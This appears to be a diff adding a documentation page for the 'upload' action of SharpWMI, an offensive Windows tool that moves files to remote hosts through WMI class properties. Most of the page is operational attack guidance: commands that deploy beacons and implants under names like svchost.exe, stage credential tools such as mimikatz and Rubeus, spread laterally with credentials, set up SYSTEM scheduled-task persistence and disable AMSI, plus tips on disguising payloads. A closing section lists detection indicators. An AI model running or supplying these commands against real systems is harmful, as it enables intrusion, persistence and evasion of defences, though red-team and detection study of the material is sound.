@@ -1,0 +1,411 @@
+---
+title: 'upload'
+description: 'Upload files to remote systems via WMI properties'
+icon: 'upload'
+---
+
+## Overview
+
+The `upload` action transfers files to remote systems using WMI class properties as a data channel. This provides file upload capabilities without requiring SMB access or file shares.
+
+<Tip>
+  File upload via WMI is useful when SMB ports are blocked or file share access is monitored. It operates entirely over WMI/RPC channels.
+</Tip>
+
+## Syntax
+
+```bash
+SharpWMI.exe action=upload [computername=HOST[,HOST2,...]] source="LOCAL_PATH" dest="REMOTE_PATH" [amsi=disable] [username=DOMAIN\user] [password=Password]
+```
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `upload` |
+| `source` | Yes | Local file path to upload |
+| `dest` | Yes | Destination path on remote system |
+| `computername` | No | Target host(s), comma-separated |
+| `amsi` | No | Set to `disable` to bypass AMSI during upload |
+| `username` | No | Username for authentication |
+| `password` | No | Password for authentication |
+
+## How It Works
+
+<Steps>
+  <Step title="Read Source File">
+    Reads local file and converts to byte array
+  </Step>
+
+  <Step title="Create WMI Class">
+    Creates temporary WMI class: `Win32_OSRecoveryConfigurationData`
+  </Step>
+
+  <Step title="Store in Property">
+    Stores file bytes as comma-separated string in `DebugOptions` property
+  </Step>
+
+  <Step title="Remote Retrieval">
+    Executes PowerShell on target to read from WMI class and write to disk
+  </Step>
+
+  <Step title="Verification">
+    Queries `CIM_DataFile` to verify file was created
+  </Step>
+
+  <Step title="Cleanup">
+    Removes temporary WMI class
+  </Step>
+</Steps>
+
+## Usage Examples
+
+### Basic File Upload
+
+<CodeGroup>
+```bash Simple Upload
+SharpWMI.exe action=upload computername=target.domain.com source="beacon.exe" dest="C:\Windows\temp\svchost.exe"
+```
+
+```bash With AMSI Evasion
+SharpWMI.exe action=upload computername=target.domain.com source="payload.exe" dest="C:\temp\update.exe" amsi=disable
+```
+
+```bash With Credentials
+SharpWMI.exe action=upload computername=target.domain.com source="implant.dll" dest="C:\Windows\System32\legit.dll" amsi=disable username="DOMAIN\admin" password="Password123!"
+```
+
+```bash Multiple Targets
+SharpWMI.exe action=upload computername=server1,server2,server3 source="beacon.exe" dest="C:\temp\svc.exe" amsi=disable
+```
+</CodeGroup>
+
+### Example Output
+
+```
+  Scope: \\target.domain.com\root\cimv2
+  User credentials: DOMAIN\admin
+
+[*] Uploading file via evil WMI static class' property: DebugOptions ...
+[*] Pulling contents from WMI repository to disk on a remote machine...
+
+[*] Host                           : target.domain.com
+[*] Command                        : powershell -w hidden -nop -c "$e=([WmiClass]'root\cimv2:Win32_OSRecoveryConfigurationData').Properties['DebugOptions'].Value;[IO.File]::WriteAllBytes('C:\Windows\temp\svchost.exe',[Byte[]][Int[]]($e-split','))"
+[*] Creation of process returned   : 0
+[*] Process ID                     : 3456
+
+[*] Confirming whether file was uploaded...
+[*] Removing evil WMI class Win32_OSRecoveryConfigurationData
+
+[+] SUCCESS: File uploaded: svchost.exe
+```
+
+## Operational Scenarios
+
+### Scenario 1: Beacon Deployment
+
+```bash
+# 1. Upload beacon
+SharpWMI.exe action=upload computername=target.domain.com source="beacon.exe" dest="C:\Windows\temp\svchost.exe" amsi=disable
+
+# 2. Execute beacon
+SharpWMI.exe action=exec computername=target.domain.com command="C:\Windows\temp\svchost.exe"
+
+# 3. Verify execution
+SharpWMI.exe action=ps computername=target.domain.com
+```
+
+### Scenario 2: Tool Staging
+
+```bash
+# Upload multiple tools
+SharpWMI.exe action=upload computername=target.domain.com source="SharpHound.exe" dest="C:\temp\process.exe" amsi=disable
+
+SharpWMI.exe action=upload computername=target.domain.com source="Rubeus.exe" dest="C:\temp\system.exe" amsi=disable
+
+SharpWMI.exe action=upload computername=target.domain.com source="SharpDPAPI.exe" dest="C:\temp\service.exe" amsi=disable
+```
+
+### Scenario 3: Lateral Movement Chain
+
+```bash
+# Upload to multiple systems
+SharpWMI.exe action=upload computername=ws01,ws02,ws03,ws04,ws05 source="lateral.exe" dest="C:\Windows\temp\update.exe" amsi=disable username="DOMAIN\admin" password="Password123!"
+
+# Execute on all systems
+SharpWMI.exe action=exec computername=ws01,ws02,ws03,ws04,ws05 command="C:\Windows\temp\update.exe -c 192.168.1.100" username="DOMAIN\admin" password="Password123!"
+```
+
+### Scenario 4: Persistence Deployment
+
+```bash
+# Upload persistence payload
+SharpWMI.exe action=upload computername=target.domain.com source="persist.exe" dest="C:\Windows\System32\WindowsUpdate.exe" amsi=disable
+
+# Create scheduled task for persistence
+SharpWMI.exe action=exec computername=target.domain.com command="schtasks /create /tn WindowsUpdateCheck /tr C:\Windows\System32\WindowsUpdate.exe /sc onlogon /ru SYSTEM" result=true
+```
+
+## File Size Considerations
+
+<Warning>
+  Large files may cause issues with WMI property size limits and memory constraints. Test with your specific file sizes.
+</Warning>
+
+**Recommendations:**
+- Keep files under 10 MB when possible
+- Test upload with small files first
+- Use compression for larger payloads
+- Consider staging larger files via other methods
+
+<Accordion title="Handling Large Files">
+  For files larger than 10 MB:
+  1. Compress the file before upload
+  2. Upload compressed file via WMI
+  3. Extract on target using PowerShell
+  4. Clean up compressed file
+
+  ```bash
+  # Upload compressed payload
+  SharpWMI.exe action=upload computername=target source="payload.zip" dest="C:\temp\data.zip" amsi=disable
+
+  # Extract on target
+  SharpWMI.exe action=exec computername=target command="powershell -c Expand-Archive C:\temp\data.zip C:\temp\" result=true
+  ```
+</Accordion>
+
+## Destination Path Guidelines
+
+<CardGroup cols={2}>
+  <Card title="Writeable Locations" icon="folder">
+    Recommended destination paths:
+    - `C:\Windows\temp\`
+    - `C:\temp\`
+    - `%APPDATA%\`
+    - `C:\ProgramData\`
+  </Card>
+
+  <Card title="Avoid Protected Paths" icon="shield">
+    Paths that may fail:
+    - `C:\Program Files\` (requires admin)
+    - `C:\Windows\System32\` (protected)
+    - Root of C:\ drive
+    - User profile without proper access
+  </Card>
+</CardGroup>
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Upload">
+    ```bash
+    # Upload to localhost (rare use case)
+    SharpWMI.exe action=upload source="file.exe" dest="C:\temp\file.exe"
+    ```
+
+    **Note:** Local uploads are uncommon. Use standard file copy for local operations.
+  </Tab>
+
+  <Tab title="Remote Upload">
+    ```bash
+    # Primary use case
+    SharpWMI.exe action=upload computername=target.domain.com source="beacon.exe" dest="C:\temp\svc.exe" amsi=disable
+    ```
+
+    **Requirements:**
+    - Admin privileges on target
+    - WMI access over network
+    - PowerShell available on target
+    - Sufficient disk space
+  </Tab>
+</Tabs>
+
+## AMSI Evasion
+
+When `amsi=disable` is specified, SharpWMI:
+
+1. Modifies registry to disable AMSI: `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable = 0`
+2. Executes PowerShell command to write file
+3. Restores original AMSI setting
+
+```bash
+SharpWMI.exe action=upload computername=target.domain.com source="mimikatz.exe" dest="C:\temp\debug.exe" amsi=disable
+```
+
+## Detection Considerations
+
+<AccordionGroup>
+  <Accordion title="WMI Class Creation" icon="radar">
+    - Creation of `Win32_OSRecoveryConfigurationData` class
+    - Unusual WMI class with large property values
+    - Temporary WMI class creation and deletion
+    - Event ID 5857-5861: WMI activity
+  </Accordion>
+
+  <Accordion title="PowerShell Execution" icon="terminal">
+    - PowerShell spawned by `wmiprvse.exe`
+    - Command line with `[IO.File]::WriteAllBytes`
+    - WMI class property read operations
+    - Event ID 4104: PowerShell script block logging
+  </Accordion>
+
+  <Accordion title="File Creation" icon="file">
+    - File written to temp directories
+    - File creation by PowerShell
+    - Suspicious file names (svchost.exe, system.exe in temp)
+    - Event ID 4663: File system access
+  </Accordion>
+
+  <Accordion title="Network Activity" icon="network-wired">
+    - Large data transfer over WMI/DCOM
+    - Unusual WMI property queries
+    - Multiple WMI operations in sequence
+    - DCOM traffic on port 135
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="File Naming" icon="tag">
+    - Use legitimate-sounding names
+    - Match existing system files
+    - Avoid obvious malware names
+    - Examples: svchost.exe, system.exe, update.exe
+  </Card>
+
+  <Card title="Path Selection" icon="map">
+    - Use temp directories
+    - Avoid monitored paths
+    - Match legitimate file locations
+    - Clean up after use
+  </Card>
+
+  <Card title="Operational Security" icon="user-secret">
+    - Always use `amsi=disable`
+    - Test upload with small files first
+    - Verify upload success before execution
+    - Delete uploaded files after use
+  </Card>
+
+  <Card title="Error Handling" icon="triangle-exclamation">
+    - Check for SUCCESS/FAILURE messages
+    - Verify file exists before execution
+    - Handle upload timeouts
+    - Monitor for AV detection
+  </Card>
+</CardGroup>
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="FAILURE: Could Not Confirm Upload">
+    **Cause:** File not written to disk or verification failed
+
+    **Solution:**
+    - Check destination path is writeable
+    - Verify sufficient disk space
+    - Ensure PowerShell is available
+    - Check AV didn't quarantine file
+    - Try different destination path
+  </Accordion>
+
+  <Accordion title="Exception During Setting Evil Property">
+    **Cause:** WMI class creation failed
+
+    **Solution:**
+    - Verify WMI service is running
+    - Check admin privileges
+    - Try smaller file size
+    - Ensure sufficient system resources
+  </Accordion>
+
+  <Accordion title="Access Denied">
+    **Cause:** Insufficient privileges
+
+    **Solution:**
+    - Verify admin credentials
+    - Check UAC remote restrictions
+    - Ensure user can write to destination
+    - Try with domain admin account
+  </Accordion>
+
+  <Accordion title="File Upload Hangs">
+    **Cause:** Large file or network issue
+
+    **Solution:**
+    - Reduce file size
+    - Check network connectivity
+    - Compress file before upload
+    - Increase timeout if possible
+  </Accordion>
+</AccordionGroup>
+
+## Cleanup
+
+After successful operations, clean up uploaded files:
+
+```bash
+# Remove uploaded file via exec
+SharpWMI.exe action=exec computername=target.domain.com command="cmd /c del C:\Windows\temp\svchost.exe" result=true
+
+# Or via PowerShell
+SharpWMI.exe action=exec computername=target.domain.com command="powershell -c Remove-Item C:\temp\*.exe -Force" result=true amsi=disable
+```
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="exec" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Execute uploaded files
+  </Card>
+  <Card title="executevbs" icon="file-code" href="/ghostpack-docs/SharpWMI-mdx/actions/executevbs">
+    Alternative execution method
+  </Card>
+  <Card title="query" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Verify file upload
+  </Card>
+  <Card title="ps" icon="list" href="/ghostpack-docs/SharpWMI-mdx/actions/ps">
+    Check uploaded file execution
+  </Card>
+</CardGroup>
+
+## Alternative Methods
+
+<Tabs>
+  <Tab title="WMI Upload (SharpWMI)">
+    **Advantages:**
+    - No SMB required
+    - Works over WMI/RPC only
+    - Evades SMB monitoring
+
+    **Disadvantages:**
+    - Slower than SMB
+    - File size limitations
+    - More complex detection artifacts
+  </Tab>
+
+  <Tab title="SMB File Copy">
+    **Advantages:**
+    - Fast transfer
+    - Native Windows functionality
+    - No size limitations
+
+    **Disadvantages:**
+    - Requires SMB access
+    - Port 445 must be open
+    - Heavily monitored
+  </Tab>
+
+  <Tab title="PowerShell Remoting">
+    **Advantages:**
+    - Built-in cmdlets
+    - Easy to use
+    - Supports large files
+
+    **Disadvantages:**
+    - Requires PSRemoting
+    - PowerShell logging
+    - May be restricted
+  </Tab>
+</Tabs>
